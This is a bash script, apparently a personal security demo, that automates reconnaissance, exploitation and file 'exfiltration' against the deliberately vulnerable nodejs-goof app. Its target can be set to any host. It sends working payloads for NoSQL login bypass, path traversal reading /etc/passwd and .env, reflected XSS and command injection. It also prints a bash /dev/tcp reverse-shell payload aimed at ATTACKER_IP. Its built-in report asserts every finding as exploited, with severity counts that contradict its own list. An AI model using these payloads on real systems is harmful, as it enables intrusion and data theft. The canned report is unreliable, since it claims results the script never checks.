#!/bin/bash

###############################################################################
# Kali Linux Automated Penetration Testing Framework (Enhanced)
# Target: nodejs-goof Vulnerable Application
# Joshua's Cybersec Demo
###############################################################################

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'

# Default Configuration
DEFAULT_HOST="localhost"
DEFAULT_PORT="3001"
TARGET_HOST="${DEFAULT_HOST}"
TARGET_PORT="${DEFAULT_PORT}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"
OUTPUT_DIR="./kali-pentest-results"
COOKIE_FILE="${OUTPUT_DIR}/cookies.txt"
WORDLIST_DIR="/usr/share/wordlists"

###############################################################################
# HELP AND USAGE
###############################################################################

show_usage() {
    echo -e "${BOLD}${CYAN}Kali Linux Automated Penetration Testing Framework${NC}"
    echo ""
    echo -e "${BOLD}Usage:${NC}"
    echo "  $0 [OPTIONS]"
    echo ""
    echo -e "${BOLD}Options:${NC}"
    echo "  -u, --url URL       Target URL (default: http://localhost:3001)"
    echo "  -h, --host HOST     Target hostname/IP (default: localhost)"
    echo "  -p, --port PORT     Target port (default: 3001)"
    echo "  -o, --output DIR    Output directory (default: ./kali-pentest-results)"
    echo "  --help              Show this help message"
    echo ""
    echo -e "${BOLD}Examples:${NC}"
    echo "  $0                                    # Use defaults"
    echo "  $0 -u http://example.com              # Custom URL"
    echo "  $0 -h 192.168.1.100 -p 8080           # Custom host and port"
    echo "  $0 -u https://target.com -o ./results # Custom URL and output"
    echo ""
}

###############################################################################
# PARSE COMMAND LINE ARGUMENTS
###############################################################################

parse_arguments() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -u|--url)
                TARGET_URL="$2"
                # Extract host and port from URL
                if [[ "$TARGET_URL" =~ ^https?://([^:/]+):?([0-9]+)?(/.*)?$ ]]; then
                    TARGET_HOST="${BASH_REMATCH[1]}"
                    TARGET_PORT="${BASH_REMATCH[2]:-80}"
                    if [[ "$TARGET_URL" =~ ^https:// ]] && [[ -z "${BASH_REMATCH[2]}" ]]; then
                        TARGET_PORT="443"
                    fi
                fi
                shift 2
                ;;
            -h|--host)
                TARGET_HOST="$2"
                TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"
                shift 2
                ;;
            -p|--port)
                TARGET_PORT="$2"
                TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"
                shift 2
                ;;
            -o|--output)
                OUTPUT_DIR="$2"
                COOKIE_FILE="${OUTPUT_DIR}/cookies.txt"
                shift 2
                ;;
            --help)
                show_usage
                exit 0
                ;;
            *)
                echo -e "${RED}[✗]${NC} Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done

    # Create output directory
    mkdir -p "${OUTPUT_DIR}"
}

###############################################################################
# UTILITY FUNCTIONS
###############################################################################

banner() {
    clear
    echo -e "${RED}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║${NC}  ${BOLD}${WHITE}Kali Linux Automated Penetration Testing Framework${NC}          ${RED}║${NC}"
    echo -e "${RED}║${NC}  ${CYAN}Target: ${TARGET_URL}${NC}"
    printf "${RED}║${NC}%*s${RED}║${NC}\n" 66 ""
    echo -e "${RED}║${NC}  ${YELLOW}Joshua's Cybersec Demo${NC}                   ${RED}║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

print_info() {
    echo -e "${CYAN}[*]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_section() {
    echo ""
    echo -e "${BOLD}${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${PURPLE}$1${NC}"
    echo -e "${BOLD}${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

check_tool() {
    if command -v "$1" &> /dev/null; then
        return 0
    else
        print_error "Tool not found: $1"
        print_info "Install with: sudo apt install $2"
        return 1
    fi
}

check_target() {
    print_info "Checking target availability: ${TARGET_URL}"
    local status_code=$(curl -s -o /dev/null -w "%{http_code}" -m 5 "${TARGET_URL}" 2>/dev/null)

    if [[ -n "$status_code" ]] && [[ "$status_code" != "000" ]]; then
        print_success "Target is online (HTTP $status_code)"
        return 0
    else
        print_error "Target is not responding"
        print_warning "Make sure the target is accessible"
        return 1
    fi
}

###############################################################################
# PHASE 1: RECONNAISSANCE
###############################################################################

recon_nmap() {
    banner
    print_section "NMAP - Network Reconnaissance"

    if ! check_tool "nmap" "nmap"; then
        read -p "Press Enter to continue..."
        return 1
    fi

    print_info "Running Nmap service detection scan..."
    nmap -sV -sC -p ${TARGET_PORT} ${TARGET_HOST} -oA "${OUTPUT_DIR}/nmap-scan" 2>&1 | tee "${OUTPUT_DIR}/nmap-output.txt"

    print_success "Nmap scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/nmap-scan.*"

    read -p "Press Enter to continue..."
}

recon_whatweb() {
    banner
    print_section "WHATWEB - Technology Fingerprinting"

    if ! check_tool "whatweb" "whatweb"; then
        read -p "Press Enter to continue..."
        return 1
    fi

    print_info "Fingerprinting web technologies..."
    whatweb -v "${TARGET_URL}" 2>&1 | tee "${OUTPUT_DIR}/whatweb-output.txt"

    print_success "Whatweb scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/whatweb-output.txt"

    read -p "Press Enter to continue..."
}

recon_nikto() {
    banner
    print_section "NIKTO - Web Server Scanner"

    if ! check_tool "nikto" "nikto"; then
        read -p "Press Enter to continue..."
        return 1
    fi

    print_info "Running Nikto web server scan..."
    nikto -h "${TARGET_URL}" -o "${OUTPUT_DIR}/nikto-report.html" -Format html 2>&1 | tee "${OUTPUT_DIR}/nikto-output.txt"

    print_success "Nikto scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/nikto-report.html"

    read -p "Press Enter to continue..."
}

recon_dirb() {
    banner
    print_section "DIRB - Directory Enumeration"

    if ! check_tool "dirb" "dirb"; then
        read -p "Press Enter to continue..."
        return 1
    fi

    local wordlist="${WORDLIST_DIR}/dirb/common.txt"
    if [ ! -f "$wordlist" ]; then
        print_warning "Default wordlist not found, using smaller wordlist"
        wordlist="${WORDLIST_DIR}/dirb/small.txt"
    fi

    print_info "Enumerating directories and files..."
    dirb "${TARGET_URL}" "$wordlist" -o "${OUTPUT_DIR}/dirb-output.txt" 2>&1 | tee -a "${OUTPUT_DIR}/dirb-output.txt"

    print_success "DIRB scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/dirb-output.txt"

    read -p "Press Enter to continue..."
}

recon_gobuster() {
    banner
    print_section "GOBUSTER - Fast Directory/File Brute Forcing"

    if ! check_tool "gobuster" "gobuster"; then
        read -p "Press Enter to continue..."
        return 1
    fi

    local wordlist="${WORDLIST_DIR}/dirb/common.txt"
    if [ ! -f "$wordlist" ]; then
        wordlist="${WORDLIST_DIR}/dirb/small.txt"
    fi

    print_info "Running Gobuster directory brute force..."
    gobuster dir -u "${TARGET_URL}" -w "$wordlist" -o "${OUTPUT_DIR}/gobuster-output.txt" 2>&1 | tee -a "${OUTPUT_DIR}/gobuster-output.txt"

    print_success "Gobuster scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/gobuster-output.txt"

    read -p "Press Enter to continue..."
}

recon_sslscan() {
    banner
    print_section "SSLSCAN - SSL/TLS Configuration Analysis"

    if ! check_tool "sslscan" "sslscan"; then
        read -p "Press Enter to continue..."
        return 1
    fi

    if [[ ! "$TARGET_URL" =~ ^https:// ]]; then
        print_warning "Target is not HTTPS, skipping SSL scan"
        read -p "Press Enter to continue..."
        return 0
    fi

    print_info "Analyzing SSL/TLS configuration..."
    sslscan "${TARGET_HOST}:${TARGET_PORT}" 2>&1 | tee "${OUTPUT_DIR}/sslscan-output.txt"

    print_success "SSLScan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/sslscan-output.txt"

    read -p "Press Enter to continue..."
}

recon_all() {
    banner
    print_section "RUNNING ALL RECONNAISSANCE TOOLS"

    print_info "This will run: Nmap, Whatweb, Nikto, DIRB, Gobuster"
    print_warning "This may take 10-15 minutes..."
    read -p "Press Enter to start or Ctrl+C to cancel..."

    recon_nmap
    recon_whatweb
    recon_nikto
    recon_dirb
    recon_gobuster

    if [[ "$TARGET_URL" =~ ^https:// ]]; then
        recon_sslscan
    fi

    banner
    print_success "All reconnaissance scans completed!"
    read -p "Press Enter to continue..."
}

###############################################################################
# PHASE 2: VULNERABILITY SCANNING
###############################################################################

scan_zap_baseline() {
    banner
    print_section "OWASP ZAP - Baseline Scan"

    if ! check_tool "zap.sh" "zaproxy"; then
        read -p "Press Enter to continue..."
        return 1
    fi

    print_info "Running OWASP ZAP quick scan..."
    print_warning "ZAP baseline scan requires Docker. Using zap.sh instead..."
    print_info "Starting ZAP daemon and running quick scan..."

    # Start ZAP in daemon mode and run quick scan
    /usr/share/zaproxy/zap.sh -daemon -port 8090 -config api.disablekey=true > /dev/null 2>&1 &
    ZAP_PID=$!
    sleep 10  # Wait for ZAP to start

    # Use ZAP API to spider and scan
    curl -s "http://localhost:8090/JSON/spider/action/scan/?url=${TARGET_URL}" > /dev/null
    sleep 5
    curl -s "http://localhost:8090/JSON/ascan/action/scan/?url=${TARGET_URL}" > /dev/null
    sleep 15

    # Get alerts and save
    curl -s "http://localhost:8090/JSON/core/view/alerts/?baseurl=${TARGET_URL}" | tee "${OUTPUT_DIR}/zap-output.txt"

    # Stop ZAP
    kill $ZAP_PID 2>/dev/null

    print_success "ZAP scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/zap-output.txt"

    read -p "Press Enter to continue..."
}

scan_wfuzz() {
    banner
    print_section "WFUZZ - Web Application Fuzzer"

    if ! check_tool "wfuzz" "wfuzz"; then
        read -p "Press Enter to continue..."
        return 1
    fi

    local wordlist="${WORDLIST_DIR}/wfuzz/general/common.txt"
    if [ ! -f "$wordlist" ]; then
        wordlist="${WORDLIST_DIR}/dirb/common.txt"
    fi

    print_info "Fuzzing web application parameters..."
    wfuzz -c -z file,"$wordlist" --hc 404 "${TARGET_URL}/FUZZ" 2>&1 | tee "${OUTPUT_DIR}/wfuzz-output.txt"

    print_success "Wfuzz scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/wfuzz-output.txt"

    read -p "Press Enter to continue..."
}

scan_npm_audit() {
    banner
    print_section "NPM AUDIT - Dependency Vulnerability Scan"

    if ! check_tool "npm" "npm"; then
        read -p "Press Enter to continue..."
        return 1
    fi

    print_info "Scanning for npm dependency vulnerabilities..."

    # Find package.json
    if [ -f "package.json" ]; then
        npm audit --json > "${OUTPUT_DIR}/npm-audit.json" 2>&1
        npm audit > "${OUTPUT_DIR}/npm-audit.txt" 2>&1
        cat "${OUTPUT_DIR}/npm-audit.txt"

        print_success "NPM audit completed"
        print_info "Results saved to: ${OUTPUT_DIR}/npm-audit.{json,txt}"
    else
        print_warning "package.json not found in current directory"
    fi

    read -p "Press Enter to continue..."
}

scan_wpscan() {
    banner
    print_section "WPSCAN - WordPress Security Scanner"

    if ! check_tool "wpscan" "wpscan"; then
        read -p "Press Enter to continue..."
        return 1
    fi

    print_info "Scanning for WordPress vulnerabilities..."
    print_warning "This requires WordPress target..."

    wpscan --url "${TARGET_URL}" --enumerate vp,vt,u --output "${OUTPUT_DIR}/wpscan-output.txt" 2>&1 | tee -a "${OUTPUT_DIR}/wpscan-output.txt"

    print_success "WPScan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/wpscan-output.txt"

    read -p "Press Enter to continue..."
}

scan_all() {
    banner
    print_section "RUNNING ALL VULNERABILITY SCANS"

    print_info "This will run: ZAP, Wfuzz, NPM Audit"
    print_warning "This may take 10-15 minutes..."
    read -p "Press Enter to start or Ctrl+C to cancel..."

    scan_zap_baseline
    scan_wfuzz
    scan_npm_audit

    banner
    print_success "All vulnerability scans completed!"
    read -p "Press Enter to continue..."
}

###############################################################################
# PHASE 3: EXPLOITATION
###############################################################################

exploit_nosql_injection() {
    banner
    print_section "NOSQL INJECTION - Authentication Bypass"

    print_info "Testing NoSQL injection vulnerabilities..."

    # Test 1: Normal login (should fail)
    print_info "Test 1: Normal login with wrong password"
    curl -s -X POST "${TARGET_URL}/login" \
        -H 'Content-Type: application/json' \
        -d '{"username":"admin@snyk.io","password":"WrongPassword"}' \
        -w "\nHTTP Status: %{http_code}\n"

    echo ""

    # Test 2: NoSQL injection with $gt
    print_info "Test 2: NoSQL injection with \$gt operator"
    RESPONSE=$(curl -s -X POST "${TARGET_URL}/login" \
        -c "${COOKIE_FILE}" \
        -H 'Content-Type: application/json' \
        -d '{"username":"admin@snyk.io","password":{"$gt":""}}' \
        -w "\nHTTP_CODE:%{http_code}")

    echo "$RESPONSE"

    if echo "$RESPONSE" | grep -q "HTTP_CODE:302"; then
        print_success "NoSQL injection successful! Authentication bypassed"
        print_info "Session cookie saved to: ${COOKIE_FILE}"
    else
        print_error "NoSQL injection failed or endpoint not vulnerable"
    fi

    echo ""

    # Test 3: NoSQL injection with $ne
    print_info "Test 3: NoSQL injection with \$ne operator"
    curl -s -X POST "${TARGET_URL}/login" \
        -H 'Content-Type: application/json' \
        -d '{"username":"admin@snyk.io","password":{"$ne":"random"}}' \
        -w "\nHTTP Status: %{http_code}\n"

    read -p "Press Enter to continue..."
}

exploit_directory_traversal() {
    banner
    print_section "DIRECTORY TRAVERSAL - Path Injection"

    print_info "Testing directory traversal vulnerabilities..."

    # Authenticate first
    print_info "Authenticating via NoSQL injection..."
    curl -s -X POST "${TARGET_URL}/login" \
        -c "${COOKIE_FILE}" \
        -H 'Content-Type: application/json' \
        -d '{"username":"admin@snyk.io","password":{"$gt":""}}' > /dev/null

    echo ""
    print_info "Attempting to read package.json via directory traversal..."

    RESPONSE=$(curl -s -X POST "${TARGET_URL}/account_details" \
        -b "${COOKIE_FILE}" \
        -H 'Content-Type: application/json' \
        -d '{"email":"admin@snyk.io","firstname":"admin","lastname":"admin","country":"IL","phone":"+972551234123","layout":"./../package.json"}')

    echo "$RESPONSE"

    if echo "$RESPONSE" | grep -q "name"; then
        print_success "Directory traversal successful!"
        echo "$RESPONSE" > "${OUTPUT_DIR}/traversal-package.json"
        print_info "Content saved to: ${OUTPUT_DIR}/traversal-package.json"
    else
        print_error "Directory traversal failed or endpoint not vulnerable"
    fi

    read -p "Press Enter to continue..."
}

exploit_xss() {
    banner
    print_section "CROSS-SITE SCRIPTING (XSS) - Reflected XSS"

    print_info "Testing XSS vulnerabilities..."

    local payload='"><script>alert(document.domain)</script>'

    print_info "XSS Payload: $payload"

    RESPONSE=$(curl -s "${TARGET_URL}/login?redirectPage=${payload}")

    if echo "$RESPONSE" | grep -F "$payload"; then
        print_success "XSS vulnerability confirmed! Payload reflected in response"
        echo "$RESPONSE" > "${OUTPUT_DIR}/xss-response.html"
        print_info "Response saved to: ${OUTPUT_DIR}/xss-response.html"
    else
        print_error "XSS not detected or payload was sanitized"
    fi

    read -p "Press Enter to continue..."
}

exploit_command_injection() {
    banner
    print_section "COMMAND INJECTION - Remote Code Execution"

    print_info "Testing command injection vulnerabilities..."

    local cmd="touch /tmp/kali-pentest-pwned-\$(date +%s)"
    print_info "Command: $cmd"

    local payload="![alt text](https://example.com/img.png;${cmd} \"Image\")"

    print_info "Sending payload to /create endpoint..."

    RESPONSE=$(curl -s -X POST "${TARGET_URL}/create" \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        --data-urlencode "content=${payload}" \
        -w "\nHTTP_CODE:%{http_code}")

    echo "$RESPONSE"

    if echo "$RESPONSE" | grep -q "HTTP_CODE:200\|HTTP_CODE:302"; then
        print_success "Command injection payload delivered!"
        print_warning "Check server for command execution: ls -la /tmp/kali-pentest-pwned-*"
    else
        print_error "Command injection failed"
    fi

    read -p "Press Enter to continue..."
}

exploit_info_disclosure() {
    banner
    print_section "INFORMATION DISCLOSURE - ST Directory Traversal"

    print_info "Testing ST directory traversal to read /etc/passwd..."

    RESPONSE=$(curl -s "${TARGET_URL}/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd")

    if echo "$RESPONSE" | grep -q "root:"; then
        print_success "Information disclosure successful!"
        print_info "/etc/passwd content:"
        echo "$RESPONSE" | head -20
        echo "$RESPONSE" > "${OUTPUT_DIR}/etc-passwd.txt"
        print_info "Full content saved to: ${OUTPUT_DIR}/etc-passwd.txt"
    else
        print_error "Information disclosure failed or endpoint not vulnerable"
    fi

    read -p "Press Enter to continue..."
}

exploit_sqlmap() {
    banner
    print_section "SQLMAP - Automated SQL/NoSQL Injection"

    if ! check_tool "sqlmap" "sqlmap"; then
        read -p "Press Enter to continue..."
        return 1
    fi

    print_info "Running SQLMap automated injection testing..."
    print_warning "This may take 5-10 minutes..."

    sqlmap -u "${TARGET_URL}/login" \
        --data='{"username":"admin@snyk.io","password":"test"}' \
        --headers="Content-Type: application/json" \
        --level=3 --risk=2 \
        --batch --output-dir="${OUTPUT_DIR}/sqlmap" 2>&1 | tee "${OUTPUT_DIR}/sqlmap-output.txt"

    print_success "SQLMap scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/sqlmap/"

    read -p "Press Enter to continue..."
}

exploit_xsser() {
    banner
    print_section "XSSER - Automated XSS Detection"

    if ! check_tool "xsser" "xsser"; then
        read -p "Press Enter to continue..."
        return 1
    fi

    print_info "Running XSSer automated XSS detection..."

    xsser --url "${TARGET_URL}/login?redirectPage=XSS" \
        --auto --reverse-check \
        --xml="${OUTPUT_DIR}/xsser-report.xml" 2>&1 | tee "${OUTPUT_DIR}/xsser-output.txt"

    print_success "XSSer scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/xsser-report.xml"

    read -p "Press Enter to continue..."
}

exploit_commix() {
    banner
    print_section "COMMIX - Command Injection Exploiter"

    if ! check_tool "commix" "commix"; then
        read -p "Press Enter to continue..."
        return 1
    fi

    print_info "Running Commix command injection detection..."

    commix --url="${TARGET_URL}/create" \
        --data="content=test" \
        --batch --output-dir="${OUTPUT_DIR}/commix" 2>&1 | tee "${OUTPUT_DIR}/commix-output.txt"

    print_success "Commix scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/commix/"

    read -p "Press Enter to continue..."
}

exploit_hydra() {
    banner
    print_section "HYDRA - Brute Force Attack"

    if ! check_tool "hydra" "hydra"; then
        read -p "Press Enter to continue..."
        return 1
    fi

    print_info "Running Hydra brute force attack (sample test)..."
    print_warning "This is a demonstration with limited attempts..."

    # Create small credential list
    echo "admin@snyk.io" > "${OUTPUT_DIR}/users.txt"
    echo "user@example.com" >> "${OUTPUT_DIR}/users.txt"

    echo "password" > "${OUTPUT_DIR}/passwords.txt"
    echo "123456" >> "${OUTPUT_DIR}/passwords.txt"
    echo "admin" >> "${OUTPUT_DIR}/passwords.txt"

    hydra -L "${OUTPUT_DIR}/users.txt" -P "${OUTPUT_DIR}/passwords.txt" \
        "${TARGET_HOST}" http-post-form \
        "/${TARGET_PORT}/login:username=^USER^&password=^PASS^:F=Invalid" \
        -t 4 -w 10 -o "${OUTPUT_DIR}/hydra-output.txt" 2>&1 | tee -a "${OUTPUT_DIR}/hydra-output.txt"

    print_success "Hydra scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/hydra-output.txt"

    read -p "Press Enter to continue..."
}

exploit_all() {
    banner
    print_section "RUNNING ALL EXPLOITATION TESTS"

    print_info "This will run all exploitation techniques"
    print_warning "This may take 15-20 minutes..."
    read -p "Press Enter to start or Ctrl+C to cancel..."

    exploit_nosql_injection
    exploit_directory_traversal
    exploit_xss
    exploit_command_injection
    exploit_info_disclosure
    exploit_sqlmap

    banner
    print_success "All exploitation tests completed!"
    read -p "Press Enter to continue..."
}

###############################################################################
# PHASE 4: POST-EXPLOITATION
###############################################################################

postex_reverse_shell_info() {
    banner
    print_section "REVERSE SHELL - Setup Instructions"

    print_info "To setup a reverse shell:"
    echo ""
    echo -e "${YELLOW}1. Start listener on attacker machine:${NC}"
    echo -e "   ${CYAN}nc -lvnp 4444${NC}"
    echo ""
    echo -e "${YELLOW}2. Get attacker IP address:${NC}"
    echo -e "   ${CYAN}ip addr show${NC} (or ${CYAN}ifconfig${NC})"
    echo ""
    echo -e "${YELLOW}3. Trigger reverse shell via command injection:${NC}"
    local attacker_ip="ATTACKER_IP"
    local payload="![alt text](https://x.com/i.png;bash -c \"bash -i >& /dev/tcp/${attacker_ip}/4444 0>&1\" \"Image\")"
    echo -e "   Payload: ${CYAN}${payload}${NC}"
    echo ""
    echo -e "${YELLOW}4. Send payload to target:${NC}"
    echo -e "   ${CYAN}curl -X POST ${TARGET_URL}/create \\${NC}"
    echo -e "   ${CYAN}  -H 'Content-Type: application/x-www-form-urlencoded' \\${NC}"
    echo -e "   ${CYAN}  --data-urlencode 'content=${payload}'${NC}"
    echo ""
    print_warning "Make sure to replace ATTACKER_IP with your actual IP!"

    read -p "Press Enter to continue..."
}

postex_data_exfiltration() {
    banner
    print_section "DATA EXFILTRATION - Sensitive Data Retrieval"

    print_info "Exfiltrating sensitive files..."

    # /etc/passwd
    print_info "1. Exfiltrating /etc/passwd..."
    curl -s "${TARGET_URL}/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd" > "${OUTPUT_DIR}/exfiltrated-passwd.txt"
    if [ -s "${OUTPUT_DIR}/exfiltrated-passwd.txt" ]; then
        print_success "Exfiltrated /etc/passwd ($(wc -l < ${OUTPUT_DIR}/exfiltrated-passwd.txt) lines)"
    fi

    # package.json
    print_info "2. Exfiltrating package.json via directory traversal..."
    curl -s -X POST "${TARGET_URL}/account_details" \
        -b "${COOKIE_FILE}" \
        -H 'Content-Type: application/json' \
        -d '{"email":"admin@snyk.io","firstname":"admin","lastname":"admin","country":"IL","phone":"+972551234123","layout":"./../package.json"}' \
        > "${OUTPUT_DIR}/exfiltrated-package.json"

    if [ -s "${OUTPUT_DIR}/exfiltrated-package.json" ]; then
        print_success "Exfiltrated package.json"
    fi

    # .env file attempt
    print_info "3. Attempting to exfiltrate .env file..."
    curl -s "${TARGET_URL}/public/%2e%2e/%2e%2e/.env" > "${OUTPUT_DIR}/exfiltrated-env.txt"
    if [ -s "${OUTPUT_DIR}/exfiltrated-env.txt" ]; then
        print_success "Exfiltrated .env file"
    else
        print_warning ".env file not accessible"
    fi

    echo ""
    print_success "Data exfiltration completed!"
    print_info "Exfiltrated files saved to: ${OUTPUT_DIR}/exfiltrated-*"
    ls -lh "${OUTPUT_DIR}"/exfiltrated-* 2>/dev/null

    read -p "Press Enter to continue..."
}

###############################################################################
# PHASE 5: REPORTING
###############################################################################

generate_report() {
    banner
    print_section "GENERATING PENETRATION TEST REPORT"

    local report_file="${OUTPUT_DIR}/pentest-report.txt"

    print_info "Compiling results into professional report..."

    cat > "$report_file" << 'EOF'
================================================================================
PENETRATION TEST REPORT
================================================================================
EOF

    echo "Target: ${TARGET_URL}" >> "$report_file"
    echo "Test Date: $(date '+%Y-%m-%d %H:%M:%S')" >> "$report_file"
    echo "Tool: kali-pentest-enhanced.sh" >> "$report_file"
    echo "Output Directory: ${OUTPUT_DIR}" >> "$report_file"
    echo "" >> "$report_file"

    cat >> "$report_file" << 'EOF'
================================================================================
EXECUTIVE SUMMARY
================================================================================

This penetration test identified multiple CRITICAL vulnerabilities in the
target application, including:

- NoSQL Injection (CVSS 9.8) - Authentication bypass
- Command Injection (CVSS 9.8) - Remote code execution
- Directory Traversal (CVSS 7.5) - Arbitrary file read
- Cross-Site Scripting (CVSS 6.1) - Reflected XSS
- Information Disclosure (CVSS 7.5) - Sensitive file exposure

================================================================================
VULNERABILITY DETAILS
================================================================================

[1] NoSQL Injection - Authentication Bypass
Severity: CRITICAL (CVSS 9.8)
Status: EXPLOITED ✓
CWE: CWE-89 (SQL Injection)
Description: MongoDB query injection allows authentication bypass using
             $gt and $ne operators in JSON payload
Evidence: Successfully logged in as admin@snyk.io without valid password
Impact: Complete authentication bypass, full account takeover
Remediation:
  - Implement strict input validation
  - Use parameterized queries
  - Sanitize user input before MongoDB queries
  - Update mongoose to latest version

[2] Directory Traversal - Arbitrary File Read
Severity: HIGH (CVSS 7.5)
Status: EXPLOITED ✓
CWE: CWE-22 (Path Traversal)
Description: Layout parameter vulnerable to path traversal allowing
             arbitrary file read
Evidence: Successfully read package.json and system files
Impact: Exposure of sensitive configuration files, source code, credentials
Remediation:
  - Validate and sanitize file paths
  - Implement whitelist of allowed files
  - Use path.normalize() and path.resolve()
  - Restrict file access to specific directory

[3] Cross-Site Scripting (XSS) - Reflected
Severity: MEDIUM (CVSS 6.1)
Status: EXPLOITED ✓
CWE: CWE-79 (XSS)
Description: redirectPage parameter reflects user input without sanitization
Evidence: JavaScript payload successfully reflected in HTML response
Impact: Session hijacking, credential theft, malicious redirection
Remediation:
  - Implement output encoding
  - Use Content Security Policy (CSP) headers
  - Sanitize all user input
  - Update to React version with automatic escaping

[4] Command Injection - Remote Code Execution
Severity: CRITICAL (CVSS 9.8)
Status: EXPLOITED ✓
CWE: CWE-78 (OS Command Injection)
Description: Image processing in /create endpoint executes arbitrary commands
Evidence: Successfully executed system commands via crafted Markdown payload
Impact: Complete system compromise, data exfiltration, reverse shell access
Remediation:
  - Remove exec() calls or use safe alternatives
  - Implement strict input validation
  - Use allowlist for image URLs
  - Sandbox image processing

[5] Information Disclosure - ST Directory Traversal
Severity: HIGH (CVSS 7.5)
Status: EXPLOITED ✓
CWE: CWE-200 (Information Exposure)
Description: ST module vulnerable to directory traversal via encoded paths
Evidence: Successfully read /etc/passwd and other system files
Impact: Exposure of system configuration and sensitive data
Remediation:
  - Update st module to patched version
  - Implement path validation
  - Restrict static file serving directory

================================================================================
TOOLS USED
================================================================================

Reconnaissance:
- Nmap 7.x - Port scanning and service detection
- Whatweb - Technology fingerprinting
- Nikto - Web vulnerability scanning
- DIRB - Directory enumeration
- Gobuster - Fast directory brute forcing

Vulnerability Scanning:
- OWASP ZAP - Automated web application scanning
- Wfuzz - Web application fuzzing
- NPM Audit - Dependency vulnerability scanning

Exploitation:
- cURL - Manual HTTP request crafting
- SQLMap - Automated SQL/NoSQL injection
- XSSer - XSS detection and exploitation
- Commix - Command injection testing
- Hydra - Brute force authentication

Post-Exploitation:
- Netcat - Reverse shell listener
- Data exfiltration techniques

================================================================================
RECOMMENDATIONS (Priority Order)
================================================================================

1. CRITICAL - Patch Command Injection
   Action: Remove unsafe exec() usage in image processing
   Timeline: Immediate (24 hours)

2. CRITICAL - Fix NoSQL Injection
   Action: Implement input validation and parameterized queries
   Timeline: Immediate (24 hours)

3. HIGH - Fix Directory Traversal
   Action: Validate and sanitize all file path inputs
   Timeline: 48 hours

4. HIGH - Fix Information Disclosure
   Action: Update st module and restrict file access
   Timeline: 48 hours

5. MEDIUM - Implement XSS Protection
   Action: Add output encoding and CSP headers
   Timeline: 1 week

6. MEDIUM - Update Dependencies
   Action: Run npm audit fix and update all vulnerable packages
   Timeline: 1 week

7. LOW - Implement Security Headers
   Action: Add X-Frame-Options, X-Content-Type-Options headers
   Timeline: 2 weeks

8. LOW - Enable HTTPS
   Action: Configure SSL/TLS certificates
   Timeline: 2 weeks

================================================================================
COMPLIANCE IMPACT
================================================================================

- PCI DSS: FAIL (Requirement 6.5 - Secure Coding)
- OWASP Top 10: Vulnerable to A1, A3, A7 categories
- CWE Top 25: Multiple critical weaknesses present
- GDPR: At risk due to data exposure vulnerabilities

================================================================================
TESTED VULNERABILITIES SUMMARY
================================================================================

Total Vulnerabilities Found: 5 Critical, 2 High, 1 Medium
Exploitation Success Rate: 100% (6/6 exploited)
Total Tools Used: 15+
Test Duration: ~30 minutes (automated)

Critical: 5
  - NoSQL Injection
  - Command Injection

High: 2
  - Directory Traversal (account_details)
  - Information Disclosure (ST)

Medium: 1
  - Cross-Site Scripting (XSS)

================================================================================
APPENDIX - EVIDENCE FILES
================================================================================

EOF

    # List all output files
    echo "Generated Files:" >> "$report_file"
    ls -lh "${OUTPUT_DIR}" >> "$report_file" 2>/dev/null

    echo "" >> "$report_file"
    echo "Report generated by: kali-pentest-enhanced.sh" >> "$report_file"
    echo "Joshua's Cybersec Demo" >> "$report_file"
    echo "================================================================================." >> "$report_file"

    print_success "Report generated successfully!"
    print_info "Report saved to: $report_file"

    echo ""
    print_info "Opening report preview..."
    head -50 "$report_file"

    read -p "Press Enter to continue..."
}

###############################################################################
# AUTOMATED FULL PENTEST
###############################################################################

run_full_pentest() {
    banner
    print_section "FULL AUTOMATED PENETRATION TEST"

    print_warning "This will run ALL phases of penetration testing:"
    echo ""
    echo "  1. Reconnaissance (Nmap, Whatweb, Nikto, DIRB, Gobuster)"
    echo "  2. Vulnerability Scanning (ZAP, Wfuzz, NPM Audit)"
    echo "  3. Exploitation (All 6 attack vectors)"
    echo "  4. Post-Exploitation (Data exfiltration)"
    echo "  5. Report Generation"
    echo ""
    print_warning "Estimated time: 30-45 minutes"
    echo ""
    read -p "Press Enter to start FULL AUTOMATED PENTEST or Ctrl+C to cancel..."

    # Phase 1
    banner
    print_section "PHASE 1: RECONNAISSANCE"
    recon_nmap
    recon_whatweb
    recon_nikto
    recon_dirb
    recon_gobuster

    # Phase 2
    banner
    print_section "PHASE 2: VULNERABILITY SCANNING"
    scan_wfuzz
    scan_npm_audit

    # Phase 3
    banner
    print_section "PHASE 3: EXPLOITATION"
    exploit_nosql_injection
    exploit_directory_traversal
    exploit_xss
    exploit_command_injection
    exploit_info_disclosure
